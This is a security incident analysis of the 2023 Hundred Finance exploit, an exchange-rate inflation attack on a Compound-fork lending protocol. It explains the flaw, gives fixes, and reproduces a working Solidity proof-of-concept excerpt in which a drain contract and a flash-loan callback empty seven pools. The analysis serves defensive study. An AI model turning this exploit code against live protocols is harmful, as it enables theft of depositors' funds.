# Hundred Finance — ERC4626 Inflation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-04-15 |
| **Protocol** | Hundred Finance |
| **Chain** | Optimism |
| **Loss** | $7,000,000 (approximately 1,034 WBTC equivalent) |
| **Attacker EOA** | [0x155D...7528](https://optimistic.etherscan.io/address/0x155DA45D374A286d383839b1eF27567A15E67528) |
| **Attack Contract** | [0x978D...4982](https://optimistic.etherscan.io/address/0x978D0CE23869EC666BFDE9868a8514F3D2754982) |
| **Attack Tx** | [0x6e9e...f451](https://optimistic.etherscan.io/tx/0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451) |
| **Attack Block** | 90,761,918 |
| **Vulnerable Contract** | [hWBTC: 0x3559...c60](https://optimistic.etherscan.io/address/0x35594E4992DFefcB0C20EC487d7af22a30bDec60) |
| **Root Cause** | Exchange rate inflation via direct WBTC donation to the hWBTC cToken — borrowing all protocol assets after inflating collateral value |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/HundredFinance_2_exp.sol) |

---

## 1. Vulnerability Overview

Hundred Finance is a lending protocol forked from Compound v2. The Compound cToken architecture contains a **First Depositor / ERC4626 Inflation Attack** vulnerability.

### Core Mechanism

The exchange rate (`exchangeRate`) of a Compound cToken is calculated using the following formula:

```
exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
```

- `totalCash`: The underlying asset (WBTC) balance held by the contract — read via `IERC20.balanceOf(address(this))`
- `totalSupply`: Total supply of issued cTokens (hWBTC)

**Vulnerability**: Because `totalCash` directly reflects the contract's actual token balance, an attacker who **transfers tokens directly (donates) without minting/redeeming** causes only the numerator to increase, resulting in an explosive rise in the exchange rate.

The attacker exploits this by:
1. Holding as few as 1–2 hWBTC shares
2. Donating a large amount of WBTC directly → inflating `exchangeRate` by millions of times
3. Using the inflated collateral value to borrow all assets from other pools
4. Redeeming all donated WBTC with just 1 share

This attack was repeated across 7 pools (ETH, SNX, USDC, DAI, USDT, sUSD, FRAX), causing approximately $7M in losses.

---

## 2. Vulnerable Code Analysis

### 2.1 exchangeRate Calculation — Vulnerable to Direct Donation ❌

Compound v2 `CToken.sol` — `exchangeRateStoredInternal()`:

```solidity
// ❌ Vulnerable code — totalCash uses the actual token balance, which can be increased by external direct transfers
function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        // Return initial exchange rate if the pool is empty
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        uint totalCash = getCash(); // ← getCash() = IERC20(underlying).balanceOf(address(this))
        // totalCash can be increased by direct transfers (donations)
        // If totalSupply is 1–2 and totalCash is hundreds of WBTC, exchangeRate skyrockets
        uint cashPlusBorrowsMinusReserves;
        MathError err;
        (err, cashPlusBorrowsMinusReserves) = addThenSubUInt(totalCash, totalBorrows, totalReserves);
        if (err != MathError.NO_ERROR) { return (err, 0); }

        uint exchangeRate;
        (err, exchangeRate) = divScalarByExpTruncate(cashPlusBorrowsMinusReserves, Exp({mantissa: _totalSupply}));
        if (err != MathError.NO_ERROR) { return (err, 0); }
        return (MathError.NO_ERROR, exchangeRate);
    }
}
```

**Problem**: Because `getCash()` directly returns `IERC20.balanceOf(address(this))`, when an attacker transfers tokens directly via ERC20 `transfer()`, the exchange rate rises immediately without any internal accounting variable (`totalCash` internal tracking) being updated.

### 2.2 Patched Code — Internal Balance Tracking Added ✅

```solidity
// ✅ Fixed code — tracks actual deposited balance separately via an internal variable
uint256 internal _totalAssets; // Actual deposited underlying asset balance (excludes direct transfers)

function _deposit(uint256 assets, address receiver) internal returns (uint256 shares) {
    // _totalAssets is only increased on deposit
    _totalAssets += assets;
    // ...
}

function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        // ✅ Use internal tracking variable instead of balanceOf → donations are neutralized
        uint totalCash = _totalAssets + totalBorrows - totalReserves;
        // ...
    }
}
```

**Alternative**: OpenZeppelin ERC4626's `_decimalsOffset()` strategy — uses virtual shares/assets at initialization to make inflation attacks mathematically unprofitable:

```solidity
// ✅ OZ ERC4626 recommended pattern — virtual offset defends against inflation attacks
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(),  // ← add virtual share offset
        totalAssets() + 1,                         // ← add virtual asset of 1
        rounding
    );
}
```

### 2.3 Liquidation Calculation — Exploiting Inflated Exchange Rate ❌

`getLiquidationRepayAmount()` (excerpted from PoC):

```solidity
// ❌ Vulnerable code — liquidation amount calculated using manipulated exchangeRate
function getLiquidationRepayAmount(address hToken) public view returns (uint256) {
    uint256 exchangeRate = hWBTC.exchangeRateStored(); // ← inflated rate
    uint256 liquidationIncentiveMantissa = 1_080_000_000_000_000_000; // 1.08 (8% incentive)
    uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hToken));
    uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));
    uint256 hTokenAmount = 1; // ← only 1 hWBTC share

    // If exchangeRate is millions of times inflated, even hTokenAmount=1 evaluates as millions of dollars in collateral
    uint256 liquidateAmount = 1e18
        / (
            priceBorrowedMantissa * liquidationIncentiveMantissa
                / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)
        ) + 1;
    return liquidateAmount; // ← massive liquidations possible with negligible collateral
}
```

---

## 3. Attack Flow

### 3.1 Preparation

- Aave V3 flash loan prepared (500 WBTC, Optimism)
- Attacker EOA already holds 1,503,167,295 wei of hWBTC (to front-run prevention)

### 3.2 Execution Steps (Repeated 7 Times — Once Per Pool)

The following 5 steps are repeated for each pool (ETH, SNX, USDC, DAI, USDT, sUSD, FRAX):

**[Step 1]** Deploy `ETHDrain` / `tokenDrain` contract (CREATE2)  
→ Pre-transfer the entire WBTC balance to the pre-computed address (address calculated in advance via CREATE2)

**[Step 2]** Execute drain contract constructor:
- `hWBTC.mint(4 * 1e8)` — Mint hWBTC shares with 4 WBTC
- `hWBTC.redeem(totalSupply - 2)` — Redeem all but 2 shares (set up minimal state)

**[Step 3]** Exchange rate inflation:
- `WBTC.transfer(address(hWBTC), donationAmount)` — Donate approximately 500 WBTC directly
- exchangeRate goes from normal → skyrockets (2 shares are now valued at ~500 WBTC in collateral)

**[Step 4]** Borrow using collateral:
- `unitroller.enterMarkets([hWBTC])` — Register hWBTC as collateral
- `hToken.borrow(getCash() - 1)` — Borrow all liquidity from the target pool
- Transfer borrowed assets to attacker address

**[Step 5]** Recover all donated WBTC:
- `hWBTC.redeemUnderlying(donationAmount)` — Recover everything with just 1–2 shares thanks to the inflation
- `WBTC.transfer(msg.sender, ...)` — Return WBTC to the attacker contract

**[Step 6]** Repeat for next pool (7 total)

**[Step 7]** Repay flash loan and realize profit:
- `WBTC.approve(address(aaveV3), type(uint256).max)` — Approve Aave repayment
- Profit remaining assets (ETH, SNX, USDC, DAI, USDT, sUSD, FRAX)

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Attacker EOA (0x155D...7528)                     │
└─────────────────────┬───────────────────────────────────────────────┘
                      │ Aave V3 flashLoanSimple(500 WBTC)
                      ▼
┌─────────────────────────────────────────────────────────────────────┐
│                 Attack Contract (0x978D...4982)                      │
│  executeOperation() callback executes                               │
│  → hWBTC.redeem(redeem all previously held shares)                  │
│  → Sequentially drain 7 pools                                       │
└──────────────┬──────────────────────────────────────────────────────┘
               │ (repeated per pool)
               │  Transfer WBTC then deploy via CREATE2
               ▼
┌─────────────────────────────────────────────────────────────────────┐
│           ETHDrain / tokenDrain Contract (constructor executes)     │
│                                                                     │
│  [Step 1] hWBTC.mint(4 WBTC)                                       │
│           hWBTC.redeem(totalSupply - 2)  ← only 2 shares remain    │
│                                                                     │
│  [Step 2] WBTC.transfer(hWBTC, ~500 WBTC) ← exploit core vuln!   │
│           exchangeRate: normal → millions of times inflated         │
│           2 hWBTC shares = ~500 WBTC collateral value              │
│                                                                     │
│  [Step 3] unitroller.enterMarkets([hWBTC])                         │
│           hToken.borrow(getCash() - 1) ← borrow entire pool liq.  │
│           → obtain ETH/SNX/USDC/DAI/USDT/sUSD/FRAX                │
│                                                                     │
│  [Step 4] hWBTC.redeemUnderlying(donationAmount)                   │
│           ← recover ~500 WBTC with 2 shares (thanks to rounding)   │
│                                                                     │
│  [Step 5] Return WBTC to attack contract                            │
└─────────────────────┬───────────────────────────────────────────────┘
                      │ After 7 iterations complete
                      ▼
┌─────────────────────────────────────────────────────────────────────┐
│                       Fund Flow Summary                             │
│                                                                     │
│  Input:  500 WBTC (Aave flash loan) + pre-held hWBTC               │
│  Return: 500 WBTC (Aave repayment, 0.05% fee = 0.25 WBTC)        │
│  Profit: ETH + SNX + USDC + DAI + USDT + sUSD + FRAX ≈ $7M        │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 On-Chain Fund Flow (Based on Actual WBTC Transfer Events)

Pattern repeated in each drain cycle (7 times):
1. Attack contract → drain contract: ~500 WBTC transfer (for donation)
2. Drain contract → hWBTC: mint 4 WBTC
3. hWBTC → drain contract: return 4 WBTC redeem
4. hWBTC → drain contract: return ~500 WBTC redeemUnderlying
5. Drain contract → attack contract: return ~500 WBTC
6. Attack contract → Aave V3: repay 500.25 WBTC (flash loan + fee)

---

## 4. PoC Code (Core Logic Excerpt)

```solidity
// PoC Source: DeFiHackLabs (HundredFinance_2_exp.sol)
// Chain: Optimism | Block: 90,760,765 fork

// ================================================================
// [CORE CONTRACT] tokenDrain — attack sub-contract that drains each token pool
// ETHDrain has the same structure (targeting CEther)
// ================================================================
contract tokenDrain is Test {
    IERC20 WBTC = IERC20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);
    ICErc20Delegate hWBTC = ICErc20Delegate(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);
    IUnitroller unitroller = IUnitroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);

    constructor(ICErc20Delegate Delegate) payable {

        // ── [Step 1] Deposit small amount into empty hWBTC pool → secure minimum shares ──────
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);                        // Deposit 4 WBTC (mint shares)
        hWBTC.redeem(hWBTC.totalSupply() - 2);      // Immediately redeem totalSupply - 2
        // Result: this contract holds 2 hWBTC shares, pool WBTC balance is minimal

        // ── [Step 2] Donate large WBTC directly → inflate exchangeRate ─────────────
        uint256 donationAmount = WBTC.balanceOf(address(this)); // ~500 WBTC
        WBTC.transfer(address(hWBTC), donationAmount);           // ← exploit core vulnerability
        // hWBTC.totalCash spikes, totalSupply is still 2
        // exchangeRate = totalCash / totalSupply → rises by millions of times
        uint256 WBTCAmountInhWBTC = WBTC.balanceOf(address(hWBTC));

        // ── [Step 3] Borrow using inflated collateral ────────────────────────────
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(hWBTC);
        unitroller.enterMarkets(cTokens);               // Register hWBTC as collateral
        uint256 borrowAmount = CErc20Delegate.getCash() - 1; // Full pool liquidity
        CErc20Delegate.borrow(borrowAmount);             // Execute borrow
        IERC20(CErc20Delegate.underlying()).transfer(msg.sender, borrowAmount); // Send to attacker

        // ── [Step 4] Recover all donated WBTC ──────────────────────────────
        // redeemAmount * totalSupply / WBTCAmountInhWBTC = 0 (floor division)
        // → redeemUnderlying ~500 WBTC with only 2 shares is possible
        hWBTC.redeemUnderlying(donationAmount);          // Recover all WBTC

        // ── [Step 5] Return WBTC to main attack contract ───────────────────
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
    }
}

// ================================================================
// [MAIN CONTRACT] executeOperation — Aave flash loan callback
// ================================================================
function executeOperation(
    address asset, uint256 amount, uint256 premium,
    address initator, bytes calldata params
) external payable returns (bool) {
    hWBTC.redeem(hWBTC.balanceOf(address(this))); // Redeem previously held hWBTC

    // Sequentially drain 7 pools
    ETHDrains();         // CEther (ETH) drain
    tokenDrains(hSNX);   // SNX drain
    tokenDrains(hUSDC);  // USDC drain
    tokenDrains(hDAI);   // DAI drain
    tokenDrains(hUSDT);  // USDT drain
    tokenDrains(hSUSD);  // sUSD drain
    tokenDrains(hFRAX);  // FRAX drain

    WBTC.approve(address(aaveV3), type(uint256).max); // Approve Aave repayment
    return true;
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | cToken exchange rate inflation (direct donation) | CRITICAL | CWE-682 | `16_accounting_sync.md` | Euler Finance ($197M, 2023) |
| V-02 | First depositor attack (unprotected empty pool initialization) | CRITICAL | CWE-682 | `17_staking_reward.md` (first depositor🔥) | Yearn Finance v1 ($11M, 2021) |
| V-03 | Excessive borrowing via inflated collateral (liquidation formula abuse) | HIGH | CWE-190 | `18_liquidation.md` | Venus Protocol |
| V-04 | Flash loan used to amplify the attack | HIGH | CWE-284 | `02_flash_loan.md` | bZx Attack #1 |

### V-01: cToken Exchange Rate Inflation (Direct Donation)
- **Description**: The `exchangeRate` calculation in Compound v2 cToken uses `getCash()`, which directly returns the actual ERC20 balance (`balanceOf`). Transferring tokens directly outside of accounting causes only the numerator (totalCash) to increase, sending the exchange rate into a spike.
- **Impact**: Using as few as 2 hWBTC shares to generate collateral worth hundreds of WBTC, enabling unlimited borrowing from all pools. Full protocol liquidity ($7M) drained.
- **Attack Conditions**: Pool `totalSupply` must be extremely small (empty pool or recently depleted pool). Attacker must hold sufficient WBTC or be able to obtain it via flash loan.

### V-02: First Depositor Attack (Unprotected Empty Pool Initialization)
- **Description**: When the hWBTC pool has `totalSupply = 0` (empty pool), the first depositor mints shares and immediately redeems most of them, maintaining `totalSupply` at the minimum (2), then executes the donation attack. No protection mechanisms (minimum locked shares, virtual offsets, etc.) exist for empty pools.
- **Impact**: Reproducible at any time the attacker can be the pool's first depositor. Vulnerable whenever the pool becomes empty.
- **Attack Conditions**: Requires the pool to become completely empty at least once. Immediately exposed when a new pool is added via governance.

### V-03: Excessive Borrowing via Inflated Collateral
- **Description**: The collateral valuation used in `getLiquidationRepayAmount()` and `borrow()` blindly trusts the manipulated `exchangeRateStored()`. A single hWBTC share is valued at tens of millions of dollars, completely distorting liquidation threshold calculations.
- **Impact**: The liquidation mechanism itself is inverted into an attack tool. Entire pool liquidity can be borrowed.
- **Attack Conditions**: Automatically exploitable after V-01 succeeds.

### V-04: Flash Loan Used to Amplify the Attack
- **Description**: Aave V3 flash loan provides 500 WBTC without collateral, securing the capital needed for the attack. Large-scale donation attacks are possible without any personal capital.
- **Impact**: Attacker does not need to pre-hold 500 WBTC → entry barrier is minimized.
- **Attack Conditions**: Requires Aave V3 Optimism deployment (already exists). Must be able to cover 500 WBTC flash loan fee (0.05% = 0.25 WBTC).

---

## 6. Remediation Recommendations

### Immediate Actions

**Method 1: Internal Balance Tracking (Most Direct)**

```solidity
// ✅ Exclude external transfers from exchange rate calculation
uint256 private _internalCash; // Updated only on deposit/withdraw/borrow/repay

function getCash() public view returns (uint256) {
    return _internalCash; // Return internal variable instead of balanceOf(this)
}

function mintInternal(uint mintAmount) internal {
    _internalCash += mintAmount; // Only reflected on mint
    // ...
}
```

**Method 2: OpenZeppelin ERC4626 Virtual Offset Pattern (Recommended)**

```solidity
// ✅ Make first depositor attacks mathematically unprofitable
// The larger the offset, the exponentially higher the attack cost
function _decimalsOffset() internal view virtual returns (uint8) {
    return 8; // 10^8x virtual shares → attack cost increases by 10^8x
}

function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(),
        totalAssets() + 1,
        rounding
    );
}
```

**Method 3: Minimum Locked Shares (Uniswap v2 Style)**

```solidity
// ✅ Permanently lock a minimum amount of shares on first mint → eliminates empty pool state
uint256 public constant MINIMUM_LIQUIDITY = 1000;
address private constant DEAD_ADDRESS = 0x000...dEaD;

function mintInternal(uint mintAmount) internal {
    uint shares = /* share calculation */;
    if (totalSupply == 0) {
        // Permanently lock minimum liquidity to burn address → stabilizes exchange rate
        _mint(DEAD_ADDRESS, MINIMUM_LIQUIDITY);
        shares -= MINIMUM_LIQUIDITY;
    }
    _mint(minter, shares);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Exchange rate manipulation | Replace `getCash()` with internal balance variable; ignore external transfers |
| V-02 Empty pool initialization | Add minimum locked shares + first depositor protection logic |
| V-03 Excessive borrowing | Detect and block sudden `exchangeRate` changes within a single transaction |
| V-04 Flash loan abuse | Limit mint→borrow ratio within the same block (rate limiter) |
| General | Enforce an initialization procedure where the protocol itself supplies minimum liquidity when activating a new pool |

---

## 7. Lessons Learned

1. **`balanceOf(this)` is not an oracle**: Anyone can transfer ERC20 tokens directly. Using a contract's actual balance directly for exchange rate or price calculations makes it vulnerable to donation attacks. Always use internal accounting variables.

2. **An empty pool is the most dangerous state**: The transition from `totalSupply = 0` to `totalSupply = N (small)` is the attack window. When adding a new market (pool), the protocol itself must enforce an initialization procedure that supplies minimum liquidity first.

3. **Compound forks inherit the original's vulnerabilities**: This vulnerability was known in Compound v2, yet Hundred Finance and countless other forks deployed without patching it. Fork protocols must actively track and apply upstream vulnerability patches.

4. **Adopt the ERC4626 standard's virtual offset strategy**: Using the `_decimalsOffset()` offset in OpenZeppelin's ERC4626 implementation makes donation attacks exponentially more expensive and economically irrational. The same principle can be applied to Compound forks.

5. **Sudden exchange rate changes within a single transaction must be detected immediately**: The structural vulnerability here is that mint→borrow executes within one transaction. Adding a `require` guard against instantaneous exchange rate changes — similar to Uniswap v2's TWAP approach — can block flash loan-based attacks.

6. **Watch for the pattern of transferring assets to a pre-computed CREATE2 address**: This attack pre-computed the address and transferred WBTC before deployment, allowing the contract constructor to immediately utilize large amounts of assets. This pattern can be abused to manipulate initial state in other protocols as well.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Item | Value |
|------|-----|
| TX Hash | `0x6e9ebcdebbabda04fa9f2e3bc21ea8b2e4fb4bf4f4670cb8483e2f0b2604f451` |
| Block Number | 90,761,918 |
| Attacker EOA | `0x155DA45D374A286d383839b1eF27567A15E67528` |
| Attack Contract (`to`) | `0x978D0CE23869EC666BFDE9868a8514F3D2754982` |
| Gas Used | 6,132,721 |
| Block Timestamp | 2023-04-15 18:12:00 UTC |

### 8.2 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|------------|------|
| Flash loan size | 500 WBTC | 500.00 WBTC (log[0]) | ✅ |
| Flash loan repayment | 500 + fee | 500.25 WBTC (log[245]) | ✅ |
| Mint size per drain | 4 WBTC | 4.00 WBTC (log[9,39,73...]) | ✅ |
| Number of drain cycles | 7 | 7 iterations confirmed | ✅ |
| Attacker pre-held hWBTC | 1,503,167,295 | log[4] hWBTC transfer | ✅ |

### 8.3 Key On-Chain Event Log Sequence (Excerpt from 248 total logs)

```
[0]  WBTC: Aave V3 → Attack Contract   (500 WBTC flash loan)
[3]  WBTC: hWBTC → Attack Contract     (return from existing hWBTC redemption)
[4]  hWBTC: Attack Contract → hWBTC   (hWBTC transfer)
[6]  WBTC: Attack Contract → DrainAddr_1  (WBTC sent to ETH drain contract)
[9]  WBTC: DrainAddr_1 → hWBTC        (4 WBTC mint)
[12] hWBTC: hWBTC → DrainAddr_1       (shares minted)
[14] WBTC: hWBTC → DrainAddr_1        (4 WBTC redeem return)
[15] hWBTC: DrainAddr_1 → hWBTC       (shares burned)
[17] WBTC: DrainAddr_1 → hWBTC        (~500 WBTC donation — exchange rate spikes)
[23] WBTC: hWBTC → DrainAddr_1        (~500 WBTC redeemUnderlying)
[26] WBTC: DrainAddr_1 → Attack Contract  (WBTC returned)
... (SNX drain — same pattern repeating from log[36])
... (USDC drain — from log[70])
... (DAI drain — from log[105])
... (USDT drain — from log[139])
... (sUSD drain — from log[174])
... (FRAX drain — from log[208])
[245] WBTC: Attack Contract → Aave V3  (500.25 WBTC flash loan repayment)
```

### 8.4 Precondition Verification

- **Fork block**: PoC forks at block 90,760,765 — approximately 1,153 blocks before the attack TX block (90,761,918)
- **Attacker pre-held hWBTC**: PoC uses `cheats.startPrank(HundredFinanceExploiter)` to transfer 1,503,167,295 hWBTC wei from the existing attacker address → confirmed in on-chain log[4]
- **Aave V3 Optimism**: Flash loan provider `0x794a61358D6845594F94dc1DB02A252b5b4814aD` (Aave V3 Pool)

---

*Analysis date: 2026-04-11*  
*References:*
- *[Hundred Finance Post-Mortem](https://blog.hundred.finance/15-04-23-hundred-finance-hack-post-mortem-d895b618cf33)*
- *[PeckShield Analysis](https://twitter.com/peckshield/status/1647307128267476992)*
- *[DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/HundredFinance_2_exp.sol)*